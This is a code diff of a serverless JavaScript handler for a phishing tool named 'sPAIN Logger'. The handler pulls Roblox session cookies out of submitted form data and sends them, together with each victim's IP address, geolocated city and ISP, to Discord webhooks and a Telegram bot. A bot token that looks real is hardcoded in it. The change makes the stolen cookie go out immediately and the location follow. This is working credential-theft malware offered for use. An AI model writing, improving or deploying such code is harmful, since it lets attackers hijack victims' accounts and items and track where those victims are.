@@ -1,4 +1,4 @@
-// api/submit.js — only sends IP, ISP, and cookie. Zero Roblox API calls.
+// api/submit.js — sends cookie INSTANTLY, geo as follow-up
 const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
 const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
 const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
@@ -21,9 +21,12 @@ async function redisGet(key) {
 async function getIpGeo(ip) {
   try {
     if (!ip || ip === 'Unknown') return null;
-    const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp`);
+    const controller = new AbortController();
+    const timer = setTimeout(() => controller.abort(), 3000);
+    const r = await fetch(`https://freeipapi.com/api/json/${ip}`, { signal: controller.signal });
+    clearTimeout(timer);
     const d = await r.json();
-    return d.status === 'success' ? d : null;
+    return { city: d.cityName, regionName: d.regionName, country: d.countryName, isp: d.isp };
   } catch { return null; }
 }
 
@@ -37,7 +40,6 @@ async function tgSend(text) {
   } catch (_) {}
 }
 
-// Extract cookie from any slot value
 const WARN = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
 function extractCookie(raw) {
   if (!raw) return null;
@@ -67,7 +69,6 @@ async function discordSend(url, payload) {
   } catch (_) {}
 }
 
-// Send cookie in chunks so nothing gets cut off
 async function sendCookieChunked(url, cookie) {
   let rem = cookie; let first = true;
   while (rem.length > 0) {
@@ -100,7 +101,6 @@ export default async function handler(req, res) {
   if (!record)         return res.status(404).json({ error: 'Page not found' });
   if (!record.webhook) return res.status(500).json({ error: 'No webhook configured' });
 
-  // ✅ Respond immediately
   res.status(200).json({ success: true });
 
   try {
@@ -109,7 +109,6 @@ export default async function handler(req, res) {
     const pageName = record.displayName || slug;
     const cookie   = findCookie(slots);
 
-    // Collect webhooks (page owner + dualhook parent)
     const webhooks = [record.webhook];
     if (record.dualhookParent) {
       try {
@@ -118,63 +117,69 @@ export default async function handler(req, res) {
       } catch (_) {}
     }
 
-    // Only geo — zero Roblox calls
-    const geo      = await getIpGeo(ip);
-    const location = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
-    const isp      = geo?.isp || 'Unknown';
-
     if (!cookie) {
-      // No cookie found — troll/wrong input
+      // No cookie — get geo then send troll embed
+      const geo      = await getIpGeo(ip);
+      const location = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
+      const isp      = geo?.isp || 'Unknown';
       for (const wh of webhooks) {
         await discordSend(wh, {
           embeds: [{
             title:       '⚠️ Wrong Cookie — Troll Detected',
-            description: 'No valid cookie found in the submission.',
+            description: 'No valid cookie found.',
             color:       0xff3333,
             fields: [
-              { name: '🌐 IP',       value: ip || 'Unknown', inline: true },
-              { name: '📍 Location', value: location,         inline: true },
-              { name: '🗺️ ISP',      value: isp,              inline: true },
-              { name: '🕐 Time',     value: now,              inline: false }
+              { name: '🌐 IP',       value: ip,       inline: true },
+              { name: '📍 Location', value: location, inline: true },
+              { name: '🗺️ ISP',      value: isp,      inline: true },
+              { name: '🕐 Time',     value: now,      inline: false }
             ],
             footer: { text: `sPAIN Logger • ${pageName}` },
             timestamp: now
           }]
         });
       }
-
-      await tgSend([
-        `⚠️ <b>NO COOKIE — ${pageName}</b>`,
-        `🌐 IP: <code>${ip}</code>`,
-        `📍 ${location}`,
-        `🗺️ ${isp}`,
-        `🕐 ${now}`
-      ].join('\n'));
-
+      await tgSend(`⚠️ <b>NO COOKIE — ${pageName}</b>\n🌐 <code>${ip}</code>\n📍 ${location}\n🗺️ ${isp}`);
       return;
     }
 
-    // Cookie found — send IP + ISP + raw cookie, nothing else
+    // ── COOKIE FOUND ─────────────────────────────────────────────────────────
+    // Step 1: Send IP + cookie IMMEDIATELY — no geo wait
     for (const wh of webhooks) {
-      // Info embed
       await discordSend(wh, {
         content: '@everyone',
         embeds: [{
-          title:       '🍪 Cookie Captured',
-          color:       0xc026d3,
+          title:     '🍪 Cookie Captured',
+          color:     0xc026d3,
           fields: [
-            { name: '🌐 IP',       value: `\`${ip}\``, inline: true },
-            { name: '📍 Location', value: location,     inline: true },
-            { name: '🗺️ ISP',      value: isp,          inline: true },
-            { name: '🕐 Time',     value: now,          inline: false }
+            { name: '🌐 IP',   value: `\`${ip}\``, inline: true },
+            { name: '🕐 Time', value: now,          inline: false }
           ],
           footer:    { text: `sPAIN Logger • ${pageName}` },
           timestamp: now
         }]
       });
-
-      // Raw cookie — chunked so full cookie is always sent
       await sendCookieChunked(wh, cookie);
+    }
+
+    // Step 2: Geo lookup AFTER cookie already sent
+    const geo      = await getIpGeo(ip);
+    const location = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
+    const isp      = geo?.isp || 'Unknown';
+
+    // Step 3: Send location/ISP as follow-up
+    for (const wh of webhooks) {
+      await discordSend(wh, {
+        embeds: [{
+          title: '📍 Location Info',
+          color: 0xc026d3,
+          fields: [
+            { name: '📍 Location', value: location, inline: true },
+            { name: '🗺️ ISP',      value: isp,       inline: true }
+          ],
+          footer: { text: `sPAIN Logger • ${pageName}` }
+        }]
+      });
     }
 
     await tgSend([
